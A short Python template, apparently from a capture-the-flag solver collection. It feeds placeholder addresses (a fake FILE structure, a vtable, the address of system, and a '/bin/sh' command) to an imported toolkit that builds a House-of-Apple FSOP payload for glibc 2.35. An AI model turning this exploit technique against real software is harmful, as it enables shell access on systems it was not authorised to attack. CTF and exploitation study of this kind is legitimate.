#!/usr/bin/env python3
"""Offline House-of-Apple placement template; no process or network interaction."""
from pathlib import Path
import sys


REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))
from pwn_fsop import FSOPError, build_fsop  # noqa: E402


def main() -> int:
    # Replace only with addresses resolved from the challenge's supplied libc and offline leak.
    addresses = {
        "file_addr": 0x404800,
        "wide_data_addr": 0x404900,
        "wide_vtable_addr": 0x404A00,
        "lock": 0x404B00,
        "system": 0x7FFFF7E12340,
        "io_wfile_jumps": 0x7FFFF7FA10C0,
        "command": "  /bin/sh",
    }
    try:
        plan = build_fsop("house_of_apple", "2.35", **addresses)
    except FSOPError as exc:
        print(f"fsop_house_of_apple: {exc}", file=sys.stderr)
        return 2
    for segment in plan.segments:
        print(f"{segment.name} @{segment.address:#x}: {segment.data.hex()}")
    print(f"trigger (manual/challenge-specific): {plan.trigger}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
